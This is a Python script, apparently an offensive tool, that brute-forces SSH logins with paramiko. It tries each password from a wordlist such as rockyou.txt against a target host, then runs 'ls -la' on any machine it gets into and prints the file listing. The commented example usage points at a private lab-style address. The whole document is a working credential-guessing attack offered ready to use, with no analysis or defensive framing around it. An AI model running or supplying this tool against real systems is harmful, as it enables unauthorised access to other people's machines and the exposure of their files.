import paramiko

def ssh_brute_force(hostname, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    count = 0

    for password in password_list:
        try:
            print(f"[*] Trying password: {password.strip()}")
            ssh.connect(hostname, port=22, username=username, password=password.strip(), timeout=5)
            print(f"[+] Success! Username: {username}, Password: {password.strip()}")

            # List files on the target machine
            list_files_on_target(ssh)
            
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {password.strip()}")
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    print("[-] Brute force attack completed. No valid credentials found.")
    return False

def list_files_on_target(ssh):
    try:
        # Execute the 'ls -la' command to list files
        stdin, stdout, stderr = ssh.exec_command("ls -la")
        files = stdout.read().decode()
        print("\n[+] Files on the target machine:\n")
        print(files)
    except Exception as e:
        print(f"[!] Error listing files: {e}")

# Example usage
#hostname = "10.13.37.107"
#username = "user"
#password_list = open("rockyou.txt", "r", encoding="latin-1").readlines()  # Use a wordlist

#ssh_brute_force(hostname, username, password_list)
